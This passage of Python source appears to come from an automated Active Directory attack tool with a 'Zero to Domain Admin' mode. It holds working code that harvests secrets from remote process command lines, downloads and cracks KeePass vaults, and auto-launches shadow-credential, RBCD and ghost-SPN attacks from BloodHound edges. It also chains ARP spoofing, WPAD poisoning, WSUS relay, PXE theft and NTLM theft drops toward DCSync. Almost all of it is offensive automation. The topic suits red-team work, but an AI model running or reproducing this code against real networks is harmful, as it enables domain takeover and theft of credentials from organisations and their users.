        ok("🔥 Zerologon (CVE-2020-1472) appears VULNERABLE")
        summary_lines.append("Zerologon: VULNERABLE")

    # --- backup_operator: "[+] DC compromised" / "saved as" success markers
    bo = _read("backup_operator")
    if re.search(r"saved as|DC compromised|secrets dumped", bo, re.I):
        ok("🔥 Backup Operators DRSR escalation appears successful")
        summary_lines.append("backup_operator: PRIV-ESC achieved")

    # --- badsuccessor: dMSA objects present
    bs = _read("badsuccessor")
    if "found" in bs.lower() and re.search(r"\bdMSA\b|results", bs, re.I):
        m = re.search(r"Found\s+(\d+)\s+result", bs)
        n = int(m.group(1)) if m else 1
        ok(f"🔥 badsuccessor: {n} dMSA object(s) (BadSuccessor 2024 vuln applicable)")
        summary_lines.append(f"badsuccessor: {n} dMSA object(s)")

    # Persist consolidated outputs
    if extracted_creds:
        creds_file = cfg.work_dir / "enrich-extracted-creds.txt"
        creds_file.write_text("\n".join(extracted_creds) + "\n")
        ok(f"📝 nxc enrichment yielded {len(extracted_creds)} credential leak(s) → {creds_file.name}")
    if summary_lines:
        (cfg.work_dir / "enrich-summary.txt").write_text("\n".join(summary_lines) + "\n")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BloodHound — graph collection (-c All) + automatic analysis
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def run_bloodhound_collect(cfg: Config) -> bool:
    """Collect AD graph data with bloodhound-python (-c All --zip), then
    parse the resulting JSON files for high-value findings.

    Equivalent to:
      bloodhound-python -c All -u USER -p PASS -d DOMAIN \\
                        -dc DC.FQDN -ns DC_IP --zip
    """
    if not tool_exists("bloodhound-python"):
        log.warning("bloodhound-python not available — skipping BloodHound collection")
        return False
    if not cfg.has_creds:
        log.warning("BloodHound is post-auth — skipping (no creds)")
        return False
    if not (cfg.domain and cfg.dc_fqdn and cfg.dc_ip):
        log.warning("BloodHound needs domain + dc-fqdn + dc-ip — skipping")
        return False

    phase_header("BLOODHOUND COLLECTION + ANALYSIS")

    bh_dir = cfg.work_dir / "bloodhound"
    bh_dir.mkdir(exist_ok=True)

    cmd = ["bloodhound-python", "-c", "All",
           "-u", cfg.username,
           "-d", cfg.domain,
           "-dc", cfg.dc_fqdn,
           "-ns", cfg.dc_ip,
           "--zip"]
    if cfg.nthash:
        cmd += ["--hashes", f":{cfg.nthash}"]
    elif cfg.password:
        cmd += ["-p", cfg.password]

    log.info(f"🐶 bloodhound-python -c All against {cfg.dc_fqdn} ({cfg.dc_ip})")
    out_file = bh_dir / "collect.log"

    # bloodhound-python writes ZIP/JSON into the current working directory
    prev_cwd = os.getcwd()
    try:
        os.chdir(bh_dir)
        result = run(cmd, cfg, timeout=900, outfile=out_file)
    finally:
        os.chdir(prev_cwd)

    if cfg.dry_run:
        return True

    if result.returncode != 0:
        log.warning(f"bloodhound-python rc={result.returncode} — see {out_file}")

    zip_files = sorted(bh_dir.glob("*bloodhound.zip"),
                       key=lambda p: p.stat().st_mtime, reverse=True)
    if not zip_files:
        zip_files = sorted(bh_dir.glob("*.zip"),
                           key=lambda p: p.stat().st_mtime, reverse=True)

    analysis: dict = {}
    if zip_files:
        ok(f"BloodHound data collected: {zip_files[0].name}")
        analysis = analyze_bloodhound_data(zip_files[0], cfg)
    else:
        # bloodhound-python may have written raw JSON without zipping
        json_files = list(bh_dir.glob("*_users.json"))
        if json_files:
            ok("BloodHound JSON files written (no zip)")
            analysis = analyze_bloodhound_data(None, cfg, json_dir=bh_dir)
        else:
            log.warning("BloodHound produced no output — collection failed")
            return False

    # Opportunistic chains: walk actionable edges and fire matching primitives
    if not cfg.no_bh_auto_action:
        _bh_auto_action(analysis.get("actionable_edges", []), cfg)
    return True


def _bh_auto_action(edges: list[dict], cfg: Config):
    """Fire opportunistic attack chains for each actionable BloodHound edge.

    Maps edge (right, target_type) → primitive:
      WriteSPN              → try_ghost_spn_upgrade   (CVE-2025-58726-style)
      AddKeyCredentialLink  → run_shadow_credentials  (PKINIT pre-auth)
      GenericAll/Write* on Computer → run_rbcd_attack (RBCD impersonation)

    De-duplicates by (action, target) so the same target isn't hit twice.
    Caps total auto-actions to avoid runaway chains."""
    if not edges:
        return

    fired: set[tuple[str, str]] = set()
    cap = 8  # safety net — don't burn the whole run on graph chasing

    phase_header("BLOODHOUND OPPORTUNISTIC CHAINS")

    for e in edges:
        if len(fired) >= cap:
            log.info(f"Auto-action cap ({cap}) reached — stopping (use --no-bh-auto-action to disable)")
            break

        action = _BH_AUTO_ACTION_MAP.get((e["right"], e["target_type"]))
        if not action:
            continue

        sam = _bh_name_to_sam(e["target_name"], e["target_type"])
        key = (action, sam)
        if key in fired:
            continue
        fired.add(key)

        log.info(f"⚡ {action} ← {e['right']} on {e['target_type']}:{e['target_name']} (sam={sam})")
        try:
            if action == "ghost_spn":
                try_ghost_spn_upgrade(sam, cfg)
            elif action == "shadow_creds":
                run_shadow_credentials(sam, cfg)
            elif action == "rbcd":
                run_rbcd_attack(sam, cfg)
        except Exception as ex:
            log.warning(f"Auto-action {action} on {sam} crashed: {ex}")

    if fired:
        ok(f"Auto-action: {len(fired)} chain(s) attempted from BloodHound edges")
    else:
        detail("No matching auto-action edges (ACE rights present but not on actionable target type)")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Loot — process command-line harvest + KeePass vault discovery/crack
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Patterns that suggest secrets in process command-lines. Tight enough that
# the noise floor stays low on a real workstation; loose enough to catch
# runas, sqlcmd, mysql, KeePass and arbitrary "/p:" style flags.
_LOOT_SECRET_PATTERNS = [
    re.compile(r"\s-p\s*\S{3,}", re.I),                # -p<pass> / -p <pass>
    re.compile(r"--password[= ]\S+", re.I),
    re.compile(r"/p(?:wd|assword)?[: =]\S+", re.I),    # /p:foo, /pwd:foo, /password=foo
    re.compile(r"\bpass(?:word)?[: =]\S+", re.I),
    re.compile(r"\b(?:secret|token|apikey|api_key)[: =]\S+", re.I),
    re.compile(r"runas\s+/user[: =]\S+", re.I),
    re.compile(r"-pw[: ]\S+", re.I),                   # KeePass -pw:
]


def _loot_get_targets(cfg: Config) -> list[str]:
    """Pick up to 10 hosts to loot. Priority: explicit target → exploit-succeeded
    hosts (working-method-*.txt) → high-value targets → relay targets."""
    if cfg.specific_target:
        return [cfg.specific_target]
    targets: list[str] = []
    for f in cfg.work_dir.glob("working-method-*.txt"):
        targets.append(f.stem.replace("working-method-", ""))
    if not targets:
        hv = cfg.work_dir / "high-value-targets.txt"
        if hv.exists():
            targets.extend([l.strip() for l in hv.read_text().splitlines() if l.strip()])
    if not targets:
        rt = cfg.work_dir / "relay-targets.txt"
        if rt.exists():
            targets.extend([l.strip() for l in rt.read_text().splitlines() if l.strip()])
    seen: set[str] = set()
    out: list[str] = []
    for t in targets:
        if t and t not in seen:
            seen.add(t)
            out.append(t)
    return out[:10]


def _loot_processes(host: str, cfg: Config) -> int:
    """Run Get-CimInstance Win32_Process via nxc -x and grep for secrets in
    command-lines. Returns number of secret-pattern hits."""
    if not tool_exists("nxc"):
        return 0
    out_file = cfg.work_dir / f"loot-procs-{host}.txt"
    auth = _nxc_auth_args(cfg)
    ps_cmd = (
        "Get-CimInstance Win32_Process | "
        "Select-Object Name,CommandLine | "
        "Format-Table -AutoSize | Out-String -Width 4096"
    )
    cmd = ["nxc", "smb", host] + auth + ["-x", f'powershell -NoP -C "{ps_cmd}"']
    log.info(f"💰 cmdline harvest on {host}")
    result = run(cmd, cfg, timeout=120, outfile=out_file)
    if result.returncode != 0 or not out_file.exists():
        return 0

    text = out_file.read_text(errors="replace")
    hits: list[str] = []
    for line in text.splitlines():
        if not line.strip() or line.lstrip().startswith(("Name ", "----", "[*]", "[+]", "[-]")):
            continue
        for pat in _LOOT_SECRET_PATTERNS:
            if pat.search(line):
                hits.append(line.strip())
                break
    if hits:
        secrets_file = cfg.work_dir / f"loot-secrets-{host}.txt"
        secrets_file.write_text("\n".join(hits) + "\n")
        ok(f"💰 Cmdline secrets on {host}: {len(hits)} hit(s)")
        for h in hits[:5]:
            detail(h[:200])
    return len(hits)


def _smb_get_file(host: str, remote_path: str, local_path: Path, cfg: Config) -> bool:
    """Pull a file from a remote host's admin share via smbclient.
    remote_path: 'C:\\Users\\foo\\db.kdbx' → fetched from C$ share."""
    if not tool_exists("smbclient"):
        return False

    rel = remote_path.strip().strip('"').strip("'")
    drive_match = re.match(r"^([A-Z]):\\(.*)$", rel, re.I)
    if drive_match:
        share = f"{drive_match.group(1).upper()}$"
        rel = drive_match.group(2)
    else:
        share = "C$"
    rel = rel.replace("/", "\\")

    if cfg.password:
        auth = ["-U", f"{cfg.domain}/{cfg.username}%{cfg.password}"]
    elif cfg.nthash:
        auth = ["-U", f"{cfg.domain}/{cfg.username}", "--pw-nt-hash"]
    else:
        return False

    cmd = ["smbclient", f"//{host}/{share}"] + auth + [
        "-c", f'get "{rel}" "{local_path}"',
    ]
    result = run(cmd, cfg, timeout=180)
    return (result.returncode == 0
            and local_path.exists()
            and local_path.stat().st_size > 0)


def _crack_kdbx(kdbx: Path, cfg: Config) -> bool:
    """keepass2john + hashcat 13400 against a downloaded .kdbx."""
    if not tool_exists("keepass2john"):
        log.debug("keepass2john missing — apt install john")
        return False
    hash_file = kdbx.with_suffix(".kdbx.hash")
    result = run(["keepass2john", str(kdbx)], cfg, timeout=60)
    if result.returncode != 0 or not (result.stdout or "").strip():
        log.debug(f"keepass2john produced no hash for {kdbx.name}")
        return False
    hash_file.write_text(result.stdout)

    wordlist: Optional[Path] = None
    for wl in WORDLISTS:
        if wl.exists() and wl.suffix != ".gz":
            wordlist = wl
            break
        if wl.suffix == ".gz" and wl.exists():
            plain = wl.with_suffix("")
            if plain.exists():
                wordlist = plain
                break
            run(["gunzip", "-k", str(wl)], cfg)
            if plain.exists():
                wordlist = plain
                break
    if not wordlist:
        log.warning(f"No wordlist for KeePass crack of {kdbx.name}")
        return False
    if not tool_exists("hashcat"):
        return False

    cracked_file = kdbx.with_suffix(".kdbx.cracked")
    log.info(f"⚙️  hashcat -m 13400 on {kdbx.name} (cap 120s)")
    run(
        ["hashcat", "-m", "13400", str(hash_file), str(wordlist),
         "--outfile", str(cracked_file), "--outfile-format=2",
         "--quiet", "--runtime=120"],
        cfg, timeout=180,
    )
    if cracked_file.exists() and cracked_file.stat().st_size > 0:
        pwd = _first_line(cracked_file.read_text())
        success_box(f"💎 KeePass cracked: {kdbx.name}")
        detail(f"Master password: {pwd}")
        return True
    detail(f"KeePass {kdbx.name} not cracked with current wordlist")
    return False


def _loot_keepass(host: str, cfg: Config) -> int:
    """Discover *.kdbx in C:\\Users, download via SMB, crack with keepass2john+hashcat."""
    if not tool_exists("nxc"):
        return 0
    list_file = cfg.work_dir / f"loot-keepass-list-{host}.txt"
    auth = _nxc_auth_args(cfg)
    ps_cmd = (
        "Get-ChildItem -Path C:\\Users -Recurse -Include *.kdbx "
        "-ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName"
    )
    cmd = ["nxc", "smb", host] + auth + ["-x", f'powershell -NoP -C "{ps_cmd}"']
    log.info(f"💰 KeePass discovery on {host}")
    result = run(cmd, cfg, timeout=180, outfile=list_file)
    if result.returncode != 0 or not list_file.exists():
        return 0

    raw = list_file.read_text(errors="replace")
    paths: list[str] = []
    for ln in raw.splitlines():
        m = re.search(r"([A-Z]:\\\S.*\.kdbx)", ln, re.I)
        if m:
            paths.append(m.group(1))
    paths = list(dict.fromkeys(paths))  # dedupe preserving order
    if not paths:
        detail(f"No KeePass vaults found on {host}")
        return 0

    ok(f"💰 KeePass vaults on {host}: {len(paths)}")
    cracked_count = 0
    for rpath in paths[:5]:
        local = cfg.work_dir / f"loot-{host}-{Path(rpath).name}"
        if _smb_get_file(host, rpath, local, cfg):
            ok(f"📥 Downloaded {rpath} → {local.name}")
            if _crack_kdbx(local, cfg):
                cracked_count += 1
        else:
            detail(f"Could not download {rpath} (no admin on share?)")
    return cracked_count


def run_loot(cfg: Config) -> bool:
    """Loot phase: process-cmdline harvest + KeePass discovery/crack across
    compromised / high-value / relay-target hosts."""
    phase_header("LOOT — process cmdlines + KeePass vaults")

    if not cfg.has_creds:
        log.warning("Loot phase needs creds — skipping")
        return False

    targets = _loot_get_targets(cfg)
    if not targets:
        log.warning("No loot targets (no compromised/HV/relay-target hosts known yet)")
        return False

    log.info(f"Looting {len(targets)} host(s): {', '.join(targets[:5])}"
             + ("..." if len(targets) > 5 else ""))

    total_secrets = 0
    total_kdbx = 0
    for host in targets:
        try:
            total_secrets += _loot_processes(host, cfg)
            total_kdbx += _loot_keepass(host, cfg)
        except Exception as ex:
            log.warning(f"Loot crashed on {host}: {ex}")

    if total_secrets or total_kdbx:
        ok(f"Loot summary: {total_secrets} cmdline secret(s), {total_kdbx} KeePass cracked")
        return True
    detail("Loot: no secrets harvested")
    return False


def _bh_load_json(json_dir: Path, suffix: str) -> list[dict]:
    """Load all *_<suffix>.json files in json_dir and return concatenated 'data' arrays."""
    items: list[dict] = []
    for jf in json_dir.glob(f"*_{suffix}.json"):
        try:
            doc = json.loads(jf.read_text(errors="replace"))
            items.extend(doc.get("data", []))
        except Exception as e:
            log.debug(f"BloodHound JSON parse failed for {jf.name}: {e}")
    return items


def _bh_find_our_sid(users: list[dict], cfg: Config) -> str:
    """Locate our own user object's SID from the BloodHound dataset."""
    if not (cfg.username and cfg.domain):
        return ""
    target = f"{cfg.username.upper()}@{cfg.domain.upper()}"
    for u in users:
        if u.get("Properties", {}).get("name", "").upper() == target:
            return u.get("ObjectIdentifier", "")
    return ""


def _bh_controlled_principals(start_sid: str, groups: list[dict]) -> set[str]:
    """Compute the set of principal SIDs we control: our own SID plus
    every group transitively containing us. Includes the well-known
    universal-membership SIDs because edges scoped to those apply to us."""
    controlled: set[str] = set()
    if start_sid:
        controlled.add(start_sid)
    # Universal/built-in groups that always include any authenticated user
    controlled.update({
        "S-1-5-11",          # Authenticated Users
        "S-1-5-32-545",      # BUILTIN\Users
        "S-1-1-0",           # Everyone
    })

    # BFS over groups: add a group if any current member is controlled
    changed = True
    while changed:
        changed = False
        for g in groups:
            gsid = g.get("ObjectIdentifier", "")
            if not gsid or gsid in controlled:
                continue
            for m in g.get("Members", []):
                if m.get("ObjectIdentifier", "") in controlled:
                    controlled.add(gsid)
                    changed = True
                    break
    return controlled


def _bh_name_to_sam(bh_name: str, obj_type: str) -> str:
    """Convert a BloodHound 'name' field to a usable AD identifier.

    Computer objects: HOST.DOMAIN.LAB → HOST$
    User/Group:       PRINCIPAL@DOMAIN.LAB → PRINCIPAL
    """
    if obj_type == "Computer":
        first = bh_name.split(".", 1)[0]
        if not first.endswith("$"):
            first = f"{first}$"
        return first
    if "@" in bh_name:
        return bh_name.split("@", 1)[0]
    return bh_name


# ACE rights that grant us a usable primitive against the target
_BH_INTERESTING_RIGHTS = {
    "WriteSPN", "AddKeyCredentialLink", "GenericAll", "GenericWrite",
    "WriteDacl", "WriteOwner", "WriteAccountRestrictions", "AddAllowedToAct",
    "ForceChangePassword", "AllExtendedRights", "Owns",
}

# (right, target_object_type) → action handler used by auto-action below
_BH_AUTO_ACTION_MAP: dict[tuple[str, str], str] = {
    ("WriteSPN",                   "Computer"): "ghost_spn",
    ("WriteSPN",                   "User"):     "ghost_spn",
    ("AddKeyCredentialLink",       "Computer"): "shadow_creds",
    ("AddKeyCredentialLink",       "User"):     "shadow_creds",
    ("GenericAll",                 "Computer"): "rbcd",
    ("GenericWrite",               "Computer"): "rbcd",
    ("WriteAccountRestrictions",   "Computer"): "rbcd",
    ("AddAllowedToAct",            "Computer"): "rbcd",
}


def analyze_bloodhound_data(zip_path: Optional[Path], cfg: Config,
                             json_dir: Optional[Path] = None) -> dict:
    """Parse BloodHound JSON for high-value findings + actionable ACE edges.
    Returns a dict with 'findings' (counts) and 'actionable_edges' (list
    of dicts: {right, target_name, target_type, target_sid}).

    The actionable-edges list is consumed by run_bloodhound_collect to
    fire opportunistic ghost-SPN / shadow-creds / RBCD chains."""
    if json_dir is None:
        json_dir = cfg.work_dir / "bloodhound" / "json"
        json_dir.mkdir(parents=True, exist_ok=True)
        try:
            with zipfile.ZipFile(zip_path) as zf:
                zf.extractall(json_dir)
        except Exception as e:
            log.warning(f"Failed to extract BloodHound ZIP: {e}")
            return {"findings": {}, "actionable_edges": []}

    users = _bh_load_json(json_dir, "users")
    computers = _bh_load_json(json_dir, "computers")
    groups = _bh_load_json(json_dir, "groups")

    log.info(f"BloodHound dataset: {len(users)} users, "
             f"{len(computers)} computers, {len(groups)} groups")

    # Build SID → name lookup so group memberships resolve to readable names
    sid_to_name: dict[str, str] = {}
    for collection in (users, computers, groups):
        for obj in collection:
            sid = obj.get("ObjectIdentifier", "")
            name = obj.get("Properties", {}).get("name", "")
            if sid and name:
                sid_to_name[sid] = name

    findings: dict[str, list[str]] = {
        "domain_admins": [],
        "enterprise_admins": [],
        "schema_admins": [],
        "kerberoastable": [],
        "asreproastable": [],
        "unconstrained_delegation": [],
        "constrained_delegation": [],
        "rbcd_inbound": [],
        "laps_computers": [],
        "admincount_users": [],
        "disabled_admins": [],
        "pwd_never_expires_admins": [],
    }

    # --- Users ---
    for u in users:
        props = u.get("Properties", {})
        name = props.get("name", "?")
        if props.get("hasspn") and "KRBTGT@" not in name.upper():
            findings["kerberoastable"].append(name)
        if props.get("dontreqpreauth"):
            findings["asreproastable"].append(name)
        if props.get("unconstraineddelegation"):
            findings["unconstrained_delegation"].append(f"USER:{name}")
        if props.get("admincount"):
            findings["admincount_users"].append(name)
            if not props.get("enabled", True):
                findings["disabled_admins"].append(name)
            if props.get("pwdneverexpires"):
                findings["pwd_never_expires_admins"].append(name)

    # --- Computers ---
    for c in computers:
        props = c.get("Properties", {})
        name = props.get("name", "?")
        if props.get("unconstraineddelegation"):
            findings["unconstrained_delegation"].append(f"COMPUTER:{name}")
        if props.get("haslaps"):
            findings["laps_computers"].append(name)
        atd = props.get("allowedtodelegate") or []
        for spn in atd:
            findings["constrained_delegation"].append(f"{name} → {spn}")
        # Inbound RBCD: someone has been granted msDS-AllowedToActOnBehalfOfOtherIdentity
        for ace in c.get("Aces", []):
            if ace.get("RightName") == "AllowedToAct":
                src = sid_to_name.get(ace.get("PrincipalSID", ""), ace.get("PrincipalSID", "?"))
                findings["rbcd_inbound"].append(f"{src} → {name}")

    # --- Groups: protected admin groups ---
    protected = {
        "DOMAIN ADMINS@": "domain_admins",
        "ENTERPRISE ADMINS@": "enterprise_admins",
        "SCHEMA ADMINS@": "schema_admins",
    }
    for g in groups:
        gname = g.get("Properties", {}).get("name", "").upper()
        for prefix, bucket in protected.items():
            if gname.startswith(prefix):
                for m in g.get("Members", []):
                    member_name = sid_to_name.get(m.get("ObjectIdentifier", ""),
                                                  m.get("ObjectIdentifier", "?"))
                    findings[bucket].append(member_name)

    # Dedupe while preserving order
    for k, v in findings.items():
        seen = set()
        deduped = []
        for item in v:
            if item not in seen:
                seen.add(item)
                deduped.append(item)
        findings[k] = deduped

    # --- Actionable-edge analysis ---
    # Build the principal closure: us + every group containing us (transitively).
    # Edges scoped to a controlled principal mean WE can wield that ACE.
    our_sid = _bh_find_our_sid(users, cfg)
    if our_sid:
        log.debug(f"BloodHound: our SID resolved to {our_sid}")
    else:
        log.debug("BloodHound: could not resolve our user SID — universal-group "
                  "edges will still be evaluated")
    controlled = _bh_controlled_principals(our_sid, groups)

    actionable_edges: list[dict] = []
    # Tag each object with its type so we know how to use the edge later
    typed_objects = (
        [(u, "User") for u in users]
        + [(c, "Computer") for c in computers]
        + [(g, "Group") for g in groups]
    )
    for obj, otype in typed_objects:
        target_sid = obj.get("ObjectIdentifier", "")
        target_name = obj.get("Properties", {}).get("name", "?")
        for ace in obj.get("Aces", []):
            right = ace.get("RightName", "")
            psid = ace.get("PrincipalSID", "")
            if right not in _BH_INTERESTING_RIGHTS:
                continue
            if psid not in controlled:
                continue
            actionable_edges.append({
                "right": right,
                "target_name": target_name,
                "target_type": otype,
                "target_sid": target_sid,
                "principal_sid": psid,
                "via": sid_to_name.get(psid, psid),
            })

    # --- Persist analysis ---
    out_file = cfg.work_dir / "bloodhound-analysis.txt"
    sections = [
        ("domain_admins",            "👑 Domain Admins"),
        ("enterprise_admins",        "👑 Enterprise Admins"),
        ("schema_admins",            "👑 Schema Admins"),
        ("kerberoastable",           "🎫 Kerberoastable users (hasspn=true)"),
        ("asreproastable",           "🔓 AS-REP roastable users (dontreqpreauth=true)"),
        ("unconstrained_delegation", "⚠️  Unconstrained delegation"),
        ("constrained_delegation",   "⚠️  Constrained delegation (allowedtodelegate)"),
        ("rbcd_inbound",             "🎟️  RBCD inbound (AllowedToAct)"),
        ("laps_computers",           "🔐 LAPS-enabled computers"),
        ("admincount_users",         "🛡️  AdminCount=1 users"),
        ("disabled_admins",          "💤 Disabled admin accounts"),
        ("pwd_never_expires_admins", "⏳ Admins with pwdneverexpires"),
    ]
    lines = [
        "=" * 60,
        f" BloodHound analysis — {cfg.domain}",
        f" {len(users)} users / {len(computers)} computers / {len(groups)} groups",
        "=" * 60,
        "",
    ]
    for key, title in sections:
        items = findings[key]
        if not items:
            continue
        lines.append(f"{title} ({len(items)})")
        for item in items[:100]:
            lines.append(f"  - {item}")
        if len(items) > 100:
            lines.append(f"  ... +{len(items)-100} more")
        lines.append("")

    # Actionable edges section
    if actionable_edges:
        lines.append(f"⚡ Actionable edges from {cfg.username or 'us'} "
                     f"({len(actionable_edges)})")
        for e in actionable_edges[:200]:
            via = f" (via {e['via']})" if e["via"] != cfg.username.upper() + "@" + cfg.domain.upper() else ""
            lines.append(f"  - {e['right']:<25} → {e['target_type']}:{e['target_name']}{via}")
        if len(actionable_edges) > 200:
            lines.append(f"  ... +{len(actionable_edges)-200} more")
        lines.append("")
    out_file.write_text("\n".join(lines))

    # --- Surface inline ---
    if findings["domain_admins"]:
        ok(f"🐶 Domain Admins: {len(findings['domain_admins'])}")
        for da in findings["domain_admins"][:5]:
            detail(da)
    if findings["kerberoastable"]:
        ok(f"🐶 Kerberoastable: {len(findings['kerberoastable'])} user(s)")
        for u in findings["kerberoastable"][:3]:
            detail(u)
    if findings["asreproastable"]:
        ok(f"🐶 AS-REP roastable: {len(findings['asreproastable'])} user(s)")
        for u in findings["asreproastable"][:3]:
            detail(u)
    if findings["unconstrained_delegation"]:
        ok(f"🐶 Unconstrained delegation: {len(findings['unconstrained_delegation'])}")
        for h in findings["unconstrained_delegation"][:3]:
            detail(h)
    if findings["constrained_delegation"]:
        ok(f"🐶 Constrained delegation: {len(findings['constrained_delegation'])} edge(s)")
    if findings["rbcd_inbound"]:
        ok(f"🐶 RBCD inbound: {len(findings['rbcd_inbound'])} edge(s)")
    if findings["laps_computers"]:
        ok(f"🐶 LAPS-readable candidates: {len(findings['laps_computers'])}")

    detail(f"Full analysis: {out_file}")

    # Feed AS-REP/Kerberoastable lists back to roast phase if files don't exist yet
    asrep_hint = cfg.work_dir / "bloodhound-asrep-targets.txt"
    if findings["asreproastable"] and not asrep_hint.exists():
        asrep_hint.write_text("\n".join(findings["asreproastable"]) + "\n")
    kerb_hint = cfg.work_dir / "bloodhound-kerberoast-targets.txt"
    if findings["kerberoastable"] and not kerb_hint.exists():
        kerb_hint.write_text("\n".join(findings["kerberoastable"]) + "\n")

    # Surface actionable edges inline + write a separate file for the auto-action loop
    if actionable_edges:
        ok(f"🐶 Actionable edges from us: {len(actionable_edges)}")
        for e in actionable_edges[:5]:
            detail(f"{e['right']} → {e['target_type']}:{e['target_name']}")
        actionable_file = cfg.work_dir / "bloodhound-actionable.txt"
        actionable_file.write_text("\n".join(
            f"{e['right']}\t{e['target_type']}\t{e['target_name']}\t"
            f"via:{e['via']}" for e in actionable_edges
        ) + "\n")
        detail(f"Actionable edges: {actionable_file}")

    return {"findings": findings, "actionable_edges": actionable_edges}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Full Auto: Zero-auth → ARP/WPAD/WSUS → Crack → Exploit → DCSync
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def run_full_auto(cfg: Config):
    """Fully automated chain: no creds needed."""
    phase_header("FULL AUTO MODE — Zero to Domain Admin")
    print(f"{C.BOLD}  🚀 Attack Plan:{C.NC}")
    detail("0️⃣   Passive sniff — detect WPAD/WSUS/PXE/LLMNR/DHCPv6 traffic")
    detail("1-3  ARP spoof → WPAD poisoning → WSUS relay → PXE theft")
    detail("4️⃣   NTLM theft file drops (.library-ms/.theme on shares)")
    detail("4.5  nxc enrichment + BloodHound -c All (graph analysis) 🐶")
    detail("5️⃣   Kerberoast + AS-REP Roast (credential harvest)")
    detail("6️⃣   AD CS — ESC1-17 detection (Certihound) / ESC1-16 exploit (certipy)")
    detail("7️⃣   SCCM NAA credential theft (sccmhunter)")
    detail("8️⃣   Enumerate targets + exploit (Shadow Creds / RBCD)")
    detail("9️⃣   WSUS update injection (AppLocker bypass)")
    detail("🔟  DCSync + DPAPI backup key extraction 👑")
    print()

    # Step 0: Passive sniff to discover viable attacks (auto-fills DC/domain)
    sniff_results = passive_sniff(cfg, duration=cfg.sniff_duration)

    # Step 0.5: Pre-cut credential discovery — 6 zero-auth foothold techniques
    # (kerbrute + CLDAP userenum, AS-REP roast, pre2k auto-test, spray).
    # If this yields creds, we skip straight to authenticated chain.
    got_creds_early = False
    try:
        got_creds_early = run_credential_discovery(cfg)
    except Exception as e:
        log.warning(f"Credential discovery phase crashed: {e}")
    wpad_viable = bool(sniff_results.get("wpad_llmnr") or sniff_results.get("dhcpv6")
                       or sniff_results.get("wpad_dns") or sniff_results.get("nbtns"))
    wsus_viable = bool(sniff_results.get("wsus"))
    pxe_viable = bool(sniff_results.get("pxe") or sniff_results.get("tftp"))

    if wpad_viable:
        ok("Passive discovery: WPAD/LLMNR/DHCPv6 traffic detected — poisoning attacks enabled")
    if wsus_viable:
        ok("Passive discovery: WSUS traffic detected — relay attack enabled")
    if pxe_viable:
        ok("Passive discovery: PXE/TFTP traffic detected — boot image credential theft enabled")
    if not wpad_viable and not wsus_viable and not pxe_viable:
        log.info("No WPAD/WSUS/PXE traffic seen passively — will still attempt active attacks")

    # Collect all hosts seen in passive sniff — prioritize for ARP spoofing
    # Collect IPs only — passive_sniff() also returns "domains" (set of
    # domain name strings) and "dcs" (dict ip → service-set). Without
    # this filter, ARP-spoof prioritisation would receive domain strings
    # and try to spoof them, wasting work and risking subtle bugs.
    sniffed_hosts: set[str] = set()
    for key, val in sniff_results.items():
        if key == "domains":
            continue                # set of domain strings, not hosts
        if key == "dcs":
            sniffed_hosts.update(val.keys())  # dict — keys are IPs
        else:
            sniffed_hosts.update(val)         # set of source IPs
    sniffed_hosts.discard(cfg.attacker_ip)
    sniffed_hosts.discard(cfg.gateway)

    # Step 1-3: ARP capture + crack (prioritize sniffed hosts).
    # Skipped entirely if early credential discovery already got us in.
    if got_creds_early:
        ok("Pre-cut discovery yielded creds — skipping ARP/WPAD/WSUS/PXE")
        got_creds = True
    else:
        got_creds = run_arp_capture(cfg, priority_hosts=sorted(sniffed_hosts) if sniffed_hosts else None)

    # Step 3b: WPAD poisoning (prioritize if passive sniff detected traffic)
    if not got_creds and not cfg.no_wpad:
        if wpad_viable:
            ok("WPAD/LLMNR traffic was detected — WPAD poisoning has high chance of success")
        log.info("Trying WPAD poisoning...")
        if run_wpad_attack(cfg):
            # try_crack_hashes returns (user, pass, domain) — must mutate cfg
            # ourselves; the helper deliberately doesn't touch cfg so callers
            # can choose to apply or discard the cracked creds.
            creds = try_crack_hashes(cfg)
            if creds:
                cfg.username, cfg.password, cfg.domain = creds
                got_creds = True

    # Step 4: WSUS relay (machine account capture)
    if not cfg.no_wsus:
        wsus_server = detect_wsus_server(cfg)
        if not wsus_server and wsus_viable:
            # Passive sniff saw WSUS traffic — extract the WSUS server IP from sniff results
            wsus_clients = sniff_results.get("wsus", [])
            log.info(f"Passive sniff detected WSUS clients: {wsus_clients}")
        if wsus_server:
            log.info(f"WSUS server found at {wsus_server} — attempting relay...")
            run_wsus_relay(cfg)
            creds = try_crack_hashes(cfg)
            if creds and not got_creds:
                cfg.username, cfg.password, cfg.domain = creds
                got_creds = True

    # Step 4b: PXE boot image credential theft (zero-auth via TFTP)
    if not got_creds and (pxe_viable or not (wpad_viable or wsus_viable)):
        log.info("Attempting PXE boot image credential extraction...")
        if run_pxe_attack(cfg):
            got_creds = cfg.has_creds

    # Step 4c: NTLM theft file drops (passive hash capture in background)
    if not cfg.no_ntlm_theft:
        log.info("Dropping NTLM theft files on writable shares (background capture)...")
        run_ntlm_theft(cfg)
        extract_hashes(cfg)
        if not got_creds:
            creds = try_crack_hashes(cfg)
            if creds:
                cfg.username, cfg.password, cfg.domain = creds
                got_creds = True

    if not got_creds:
        fail_box("Failed to capture/crack credentials via ARP/WPAD/WSUS/PXE/NTLM-theft")
        log.warning(f"Captured hashes (if any): {cfg.work_dir / 'captured-ntlmv2.txt'}")
        log.warning(f"Crack manually: hashcat -m 5600 {cfg.work_dir}/captured-ntlmv2.txt rockyou.txt")
        return

    separator()
    ok(f"🔑 Switching to authenticated attack chain")
    ok(f"Credentials: {cfg.domain}\\{cfg.username}")
    print()

